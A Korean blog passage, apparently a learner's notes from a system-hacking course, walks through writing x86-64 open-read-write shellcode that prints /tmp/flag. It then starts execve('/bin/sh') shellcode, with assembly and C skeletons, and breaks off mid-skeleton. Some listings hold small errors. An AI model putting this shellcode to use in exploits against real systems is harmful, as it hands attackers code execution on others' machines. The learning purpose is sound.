
&lt;p&gt;관련해 기억나는 게 있을 것이다… 그렇다! &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;이전 포스팅&lt;/a&gt;에서 이미 비슷한 내용을 다룬 적 있다.&lt;/p&gt;

&lt;p&gt;syscall 어셈블리 명령이 실행되면 CPU는 rax부터 쳐다본다. syscall 테이블의 인덱스와 rax 내부의 값을 대조해 지금 실행하려는 syscall이 어떤 종류인지 알고 싶어서이다. 그 이후 유저 권한에서 시스콜을 요청한다면 rdi→rsi→rdx→rcx→r8→r9→stack 의 순서로 레지스터를 확인해 arguments를 가져간다.&lt;/p&gt;

&lt;h2 id=&quot;셸코드-작성하기&quot;&gt;셸코드 작성하기&lt;/h2&gt;

&lt;h3 id=&quot;1-int-fd--opentmpflag-o_rdonly-null&quot;&gt;1. int fd = open(”/tmp/flag”, O_RDONLY, NULL)&lt;/h3&gt;

&lt;p&gt;리눅스 시스템 콜 중 open 시스템 콜의 용법은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;문서를 읽어 보니&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;flags는 반드시 access modes중 하나를 가지고 있어야 했다. access modes의 종류는 아래와 같다. 플래그는 문자열이 아닌 바이너리 값(숫자)로 들어간다는 것을 알고 있자!
    &lt;ul&gt;
      &lt;li&gt;O_RDONLY: read-only //0x00&lt;/li&gt;
      &lt;li&gt;O_WRONLY: write-only //0x01&lt;/li&gt;
      &lt;li&gt;O_RDWR: read/write //0x02&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mode_t mode&lt;/code&gt; 파라미터는 만일 없는 파일을 참조할 때 플래그에 O_CREAT나 O_TMPFILE이 설정되어 있으면 파일을 새로 만드는데, 이 때 새로 만들어질 파일에 대한 유저의 권한을 정의한다. 역으로 말해서, 앞서 언급한 두 플래그가 설정되어 있지 않다면 무시해도 된다. 무시해도 되는 상황을 만들어서 실제로 디버거를 켜서 확인해 보니, mode argument가 들어가는 rdx에 전혀 신경쓰지 않는 동작을 확인할 수 있었다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;즉 우리는 read-only 모드로 액세스하고 싶으며 다른 플래그를 설정하지 않을 것이므로&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int open(const char *pathname, int flags);&lt;/code&gt; 형태로 시스콜을 사용할 수 있다.&lt;/p&gt;

&lt;p&gt;syscall 어셈블리어가 실행될 때 rax에는 0x02, rdi에는 “/tmp/flag”라는 문자열(엔디안 고려)의 시작 주소(문자열은 보통 시작 주소 포인터로 접근하므로), rsi에는 O_RDONLY의 고유값인 0x00이 들어가 있어야 한다.&lt;/p&gt;

&lt;p&gt;또한 스택에는 큰 주소부터 차곡차곡 작은 주소로 데이터가 입력된다. &lt;del&gt;스트링 데이터를 넣는 것이므로 엔디언을 고려할 필요 없다.(이건 내 추측)&lt;/del&gt; 즉 이를 고려하면 “/tmp/flag”를 스택에 넣어줘야 하고, 이 값을 아스키 코드의 hex로 변환했을 때 아래와 같은 값이 나온다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x67616c662f705d742f&lt;/code&gt; = galf/pmt/&lt;/p&gt;

&lt;p&gt;이제까지 도출한 정보를 정리해 어셈블리어로 표현하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;2-readfd-buf-0x30&quot;&gt;2. read(fd, buf, 0x30)&lt;/h3&gt;

&lt;p&gt;open() 시스콜은 file descripter를 리턴한다. 이 file descripter는 양의 정수로 파일 시스템에서 파일에 접근할 수 있게 해주는 테이블의 인덱스이다. 자세한 내용은 리눅스의 파일 시스템을 공부하면 알 수 있다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;fd: 시스콜의 리턴값은 rax에 저장되므로, read를 수행하기 위해서는 앞서 정의한 어셈블리어를 수행한 직후 rax의 값에 접근해야 한다. 즉, rax의 값을 살리기 위해 read()의 arguments중 첫번째인 fd가 저장되는 rdi에 rax를 미리 넣어두고 동작을 지시해야 한다.&lt;/li&gt;
  &lt;li&gt;buf: 이는 프로그램의 함수 내에서 선언된 지역 변수이기 때문에 스택에 자리를 만드는 것이 응당하다. 따라서 스택에 0x30만큼의 자리를 확보해 준다. 즉, [rsp-0x30]을 해당 버퍼의 시작 주소로 지정해 주면 된다(스택은 큰 주소에서 작은 주소로 자라나기 때문에, 스택의 꼭대기인 rsp가 가리키는 곳에서 0x30만큼 작아진 곳이라면 스택의 데이터를 망치지 않는 곳에 공간을 확보한 것이 된다). 그에 맞게 두번째 arguement가 저장되는 rsi에 [rsp-0x30]을 넣어주면 된다.&lt;/li&gt;
  &lt;li&gt;0x30: 파일에서 읽어낼 길이이며, 세번째 argument이므로 rdx에 그 값을 저장한다. 이 경우에는 rdx에 0x30을 넣어주면 된다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;rax에 있던 리턴값을 저장한 이후 read syscall을 사용하기 위해 rax를 0x00으로 설정해 준다.&lt;/p&gt;

&lt;p&gt;이 정보를 어셈블리어로 정리하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, rax
lea rsi, [rsp-0x30] // == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : 이게 가능한 이유는 rsp와 rbp가 스택의 끝과 시작을 가리키는 포인터이기 때문이다. 
// 즉, 레지스터 내부에 있는 값이 가리키는 주소가 바로 스택의 시작과 끝이다. 레지스터에 있는 값을 변경하면 바로 스택의 시작과 끝을 기준으로 이동한 위치에 접근할 수 있다.
mov rdx, 0x30
mov rax, 0x00
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;3-write1-buf-0x30&quot;&gt;3. write(1, buf, 0x30)&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;첫 번째 argument인 출력 위치는 rdi를 참조하므로 rdi를 0x01로 지정한다.&lt;/li&gt;
  &lt;li&gt;두번째 argument인 buf의 시작주소는 rsi를 참조하므로 rsi를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; 로 지정해 준다. (2번 과정에서 이미 rsp를 원하는 대로 변경해 줬기 때문이다)&lt;/li&gt;
  &lt;li&gt;세번째 argument, 쓸 데이터의 길이인 0x30은 rdx에 저장되므로 rdx에 0x30을 넣어준다.&lt;/li&gt;
  &lt;li&gt;write syscall을 사용하기 위해 rax를 0x01로 설정해 준다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이 정보를 어셈블리어로 정리하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;4-정말-중요한-이야기-헷갈리지-말자-rsp-rbp의-의미&quot;&gt;4. 정말 중요한 이야기-헷갈리지 말자! (rsp, rbp의 의미)&lt;/h3&gt;

&lt;p&gt;문득 굉장히 이상한 점이 느껴진다. 사실 드림핵 자료에 나와 있는 어셈블리어의 원본은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea rsi, [rsp-0x30]&lt;/code&gt; 이 아니라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp -&amp;gt; sub rsi, 0x30&lt;/code&gt; 이다. 다른 말로 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, [rsp-0x30]&lt;/code&gt; 으로 rsp에 저장된 값에서 0x30을 뺀 값을 rsi가 가진다는 말이 된다.&lt;/p&gt;

&lt;p&gt;즉, rsp와 rbp 등의 레지스터는 그 자체가 스택의 시작과 끝에 위치한 게 아니라, 그 안에 저장된 값이 스택의 시작과 끝의 메모리 주소인 것이다. 애초에 CPU 내부에 있는 레지스터가 어떻게 메모리의 주소를 가질 수 있겠느냐만은, 나는 초보자인지라 개념을 헷갈리는 바람에 ‘이상하다, rsp는 스택의 끝일 텐데 왜 rsp 내부의 값에서 0x30을 뺀 게 스택의 끝에서 0x30 내려온 주소에 접근하는 결과가 되는 거지?’라는 고민에 골머리를 앓았었다. 결국 디버거를 이용해 어셈블리어를 확인하고 ‘맞다 이거 레지스터였다’라는 깨달음을 얻게 되기까지 시간 꽤나 잡아먹었다… 다른 초보자 분들은 이런 착각을 하시더라도 이 글을 보고 빠른 정정 하시길 바란다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;고등학생 시절 수학을 독학할 때가 생각난다. 그때도 이렇게 개념이 확실하게 체화되지 않은 상태에서 응용하다가 개념 자체를 헷갈려서 맞닥뜨리는 문제에 많이 맞닥뜨렸었다. 시간이 흐른 뒤 다시 해당 문제를 돌아보니 내가 왜 그걸 문제점으로 생각했는지 자체를 황당해하게 되더라. 아마도 나중에 내가 이걸 읽어보면 똑같은 기분을 느끼지 않을까. 푸하하하&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;5-종합&quot;&gt;5. 종합&lt;/h3&gt;

&lt;p&gt;이제까지 쓴 어셈블리 코드를 모두 종합하면 아래와 같다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;; open()
mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f ; 드림핵 자료에서는 먼저 스택에 0x67을 넣고 뒤의 데이터를 rax에 넣은 후 rax의 데이터를 스택에 넣어주는데, 왜 그렇게 했지? 이유 아는 분은 알려주세요.
; 글로벌 보안캠프에서 만났던 친구가 가끔 어셈블리어 코드는 비효율적인 행동을 한댔는데, 그것 때문인가...
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall

; read()
mov rdi, rax
lea rsi, [rsp-0x30] ; == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : 이게 가능한 이유는 rsp와 rbp가 스택의 끝과 시작을 가리키는 포인터이기 때문이다. 
; 즉, 레지스터 내부에 있는 값이 가리키는 주소가 바로 스택의 시작과 끝이다. 레지스터에 있는 값을 변경하면 바로 스택의 시작과 끝을 기준으로 이동한 위치에 접근할 수 있다.
mov rdx, 0x30
mov rax, 0x00
syscall

; write()
mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;orw-셸코드-컴파일-및-실행&quot;&gt;orw 셸코드 컴파일 및 실행&lt;/h2&gt;

&lt;p&gt;셸코드는 그냥 기계어로 번역하면 CPU가 이해할 수는 있지만 실행 파일의 형식이 아니기 때문에 시스템이 이것을 실행해야 한다는 사실을 몰라서 실행하지 않게 된다. 따라서 gcc 컴파일러를 통해 어셈블리어를 저장한 소스 파일인 orw.S 파일을 ELF 파일 형식으로 변형해 줘야 한다.&lt;/p&gt;

&lt;p&gt;어셈블리 코드를 컴파일하는 방법에는 여러 가지가 있지만, 이번 코스에서 배운 것은 c 언어로 스켈레톤 코드를 작성한 후 그 위에 셸코드를 얹어서 실행하도록 하는 것이었다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;스켈레톤 코드: 핵심 내용이 비어있는, 기본 구조만 갖춘 코드. 그 안에 핵심 내용으로 셸코드를 집어넣어 컴파일함으로써 셸코드를 컴파일할 수 있다&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x67616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;lea rsi, [rsp-0x30]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdx, 0x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C언어에서 어셈블리어 명령을 끼워넣으려면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm__(&quot;one line&quot;)&lt;/code&gt; 으로 수행하거나, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__asm{multi line}&lt;/code&gt; 으로 수행하면 되는데, XCode(맥북의 그것 맞다)에 있는 gcc가 아니라면 VC에서 하는 것처럼 어셈블럭을 사용하는 것이 먹히지 않는다.(최근에 업데이트 됐다면 내가 틀렸을 것이다) 그래서 한 줄씩 작성해야 하는 전자의 방식을 채택한 것으로 추측한다.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;그러나 궁금한 점. main 함수 안에 넣어도 되는데 왜 저렇게 분리했는지 모르겠고, run_sh() 함수는 어셈블리어를 포함하는 것이 아닌 걸로 보이는데 왜 run_sh를 만들어 넣은 것인지 의문이다. 누가 좀 알려주라….&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;아무튼, 이렇게 쓰고 컴파일을 돌렸는데…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%201.jpeg&quot; alt=&quot;어라? 이상한 오류가 생겼다.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;어라? 이상한 오류가 생겼다.&lt;/p&gt;

&lt;p&gt;‘missing or invalid immediate expression’. immediate 형의 데이터가 올바르지 않은 규격이라는 뜻 같았다. 대체 왜 이런 오류가 뜨지? 궁금해서 찾아봤다.&lt;/p&gt;

&lt;p&gt;먼저 어셈블리어에서 immediate가 들어가는 용어는 두 가지가 있었다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;immediate expression: 인스트럭션에 value가 하드코딩되어 있을 때 이를 칭하는 용어&lt;/li&gt;
  &lt;li&gt;immediate addressing: 인스트럭션(opcode + operand)의 operand에 immediate data가 존재하는 것으로, 주소를 직설적으로 지정해 주는 것&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;다만, 이렇게 immediate가 붙는 방식에는 무조건 제한이 있었다. 바로 ‘데이터 크기가 address 영역 사이즈만큼 제한된다’ 는 점이었다. 애초에 operand가 opcode 실행 시 사용할 데이터의 주소를 나타내기 위한 영역이기 때문이다. 또한 immediate의 길이는 instruction의 길이 제한이 설정되어 있다면 그것에도 영향을 받는다.&lt;/p&gt;

&lt;p&gt;현재 내가 사용하고 있는 환경은 리눅스 x86-64 64bit이고, 메모리 address 표현 방식은 64bit로 표현된다. 전자의 64bit는 word 수이고 후자는 메모리 주소의 길이이므로 헷갈리면 안 된다.&lt;/p&gt;

&lt;p&gt;즉 메모리 주소가 64bit이기 때문에 내가 집어넣을 수 있는 immediate data의 길이 한계는 64bit일 것이다.&lt;/p&gt;

&lt;p&gt;따라서  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov r8, 0x67616c662f705d742f\n&lt;/code&gt; 를 내 환경이 소화할 수 있는 인스트럭션으로 바꾸어 주면,&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov r8, 0x616c662f706d742f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push r8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 된다.&lt;/p&gt;

&lt;p&gt;이렇게 고쳐서 컴파일을 시도하니 아무 오류 없이 성공할 수 있었다!&lt;/p&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/flag&lt;/code&gt; 파일을 만들어 그 안에 원하는 내용을(48 바이트 이내) 써둔 후, 컴파일한 셸코드를 실행하면 해당 내용이 콘솔에 출력되게끔 할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%202.jpeg&quot; alt=&quot;실제로 실행한 결과.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실제로 실행한 결과.&lt;/p&gt;

&lt;p&gt;gdb에 orw를 물려서 실행 과정을 살펴봤는데, 내가 입력하고 싶은 스트링이 쭈루룩 들어가고 의도했던 시스콜이 알맞은 인자를 가지고 제대로 돌아가는 걸 눈으로 직접 확인하니 너무 신기하고 재미있었다. 히히&lt;/p&gt;

&lt;p&gt;그런데 이상한 점. 플래그의 글자 수를 세어 보면 29글자로 원래 의도했던 48바이트보다 한참 작은 크기의 문자열을 읽어왔음을 알 수 있다. 이러면 29바이트 + 19바이트 쯤으로 뒤에 쓰레기값이 붙어 나와야 하는데(드림핵 자료에서도 동일한 이야기를 하고 있다)…. 나는 왜 안 나오지? ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 이상한데…&lt;/p&gt;

&lt;aside&gt;
⚙ Uninitialized Memory &lt;br /&gt;
  
스택은 각 함수별로 스택 프레임이라는 제도를 만들어 공간을 분리해 사용하는, 일종의 함수간 공유 자원으로 정의될 수 있다. 그러나 어떤 함수를 수행하고 다시 원래의 함수로 돌아올 때, 직전의 함수의 스택 프레임 영역을 0으로 초기화하는 게 아니라(Uninitialized Memory) 그냥 rbp와 rsp의 위치만 옮겨 오는 원리로 스택을 관리하기 때문에 이전 스택 프레임의 데이터는 고스란히 남아 있게 된다. 이것이 바로 쓰레기 값(garbage data)이다.

이런 쓰레기 값에 잘 접근하면 프로세스가 프로그래머의 의도와는 다른 동작을 하도록 만들 수 도 있고, 중요한 정보를 읽어낼(Memory Leak) 수도 있다. 이런 걸 막기 위해 시큐어 코딩이라는 것을 하는데, 그건 KISA 들어가서 찾아보면 지침서가 나오니 관심 있는 사람들은 그쪽을 참고하시길!

&lt;/aside&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;execve-셸코드&quot;&gt;execve 셸코드&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;일반적으로 셸코드라고 부르는 것은 모두 이 셸코드&lt;/li&gt;
  &lt;li&gt;execve 명령어가 셸을 실행시키는 것이기 때문에 이 명령어를 실행시킬 수만 있다면 해당 시스템의 제어 권한을 획득할 수 있게 된다.&lt;/li&gt;
  &lt;li&gt;최신의 리눅스가 사용하는 기본 셸 프로그램은 sh, bash이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;execvebinsh-null-null&quot;&gt;execve(”/bin/sh”, null, null)&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;execve 코드는 오로지 execve 시스템 콜만으로 구성된다.&lt;/li&gt;
  &lt;li&gt;execve를 실행한 프로그램이 execve가 실행한 프로그램으로 대체된다. (완전히 덮어씌워진다-OS에서 배울 수 있다)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;execve system call format&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;linux execve manual&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;arg1: 실행할 프로그램의 path&lt;/li&gt;
      &lt;li&gt;arg2: 실행될 프로그램에게 인자로 넘겨질 스트링들의 시작 주소를 가리키는 포인터들의 배열&lt;/li&gt;
      &lt;li&gt;arg3: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key=value&lt;/code&gt; 형식으로 실행될 프로그램에게 넘겨질 환경 변수.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이번 실습에서는 sh만 실행하면 되기 때문에 arg2, arg3는 신경쓰지 않는다. 다만 arg2와 arg3를 무시하는 조건이 없기 때문에 arg2, arg3는 NULL로 채워 준다.&lt;/p&gt;

&lt;p&gt;위 코드를 실행할 수 있는 셸코드는 무엇일까? 한 번 작성해 보았다. ‘/bin/sh’ 문자열은 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;직전 포스트에서&lt;/a&gt; 배웠던 pwntools의 unpacking 함수를 이용해 little endian의 hex로 변환했다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;push 0x68732f6e69622f ; 7byte이므로 immediate data로 사용 가능하다.
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;이제 앞에서 진행했던 실습처럼 C 언어로 스켈레톤 코드를 만들고 그 안에 execve 실행 어셈블리 코드를 탑재해 컴파일 후 실행해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

